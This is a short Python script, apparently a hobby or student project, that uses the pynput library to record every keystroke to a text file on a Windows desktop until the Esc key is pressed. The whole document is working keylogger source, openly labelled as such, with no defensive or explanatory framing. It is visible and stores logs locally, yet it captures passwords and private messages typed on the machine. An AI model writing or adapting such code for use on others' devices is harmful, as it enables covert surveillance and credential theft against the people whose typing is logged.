#hello this is project no 3

from pynput.keyboard import Key, Listener

log_file = r"C:\Users\yash\Desktop\keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char if hasattr(key, 'char') else ' ' if key == Key.space else f' {key} '}")
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    return key != Key.esc

print("Starting keylogger...")
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
print("Keylogger stopped.")
